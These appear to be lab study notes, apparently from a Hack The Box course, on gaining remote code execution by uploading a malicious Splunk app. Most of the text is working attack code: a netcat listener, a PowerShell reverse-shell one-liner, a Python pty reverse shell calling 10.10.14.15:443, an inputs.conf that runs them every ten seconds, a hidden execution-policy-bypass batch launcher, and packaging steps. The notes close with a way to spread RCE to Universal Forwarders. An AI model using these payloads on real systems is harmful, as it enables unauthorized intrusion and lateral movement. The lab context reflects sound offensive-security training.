## Abusing Built-In Functionality

Upload this: https://github.com/0xjpuff/reverse_shell_splunk
```
sudo nc -lnvp 443
```
- Apps > Settings icon

OR

To create an application in Splunk, it must be this structure
```
MasterMarkyMark@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```
- bin file has scripts
- default file has inputs.conf

PowerShell one-liner
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
- enabled and runs every 10 seconds

**Batch file to run the script in Splunk
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

**Zip up and upload to Splunk
```
tar -cvzf updater.tar.gz splunk_shell/
```

**Linux host
- We would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If compromised host is a Splunk server, then we have get RCE on Universal Forwarders by placing the app in $SPLUNK_HOME/etc/deployment-apps.
In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
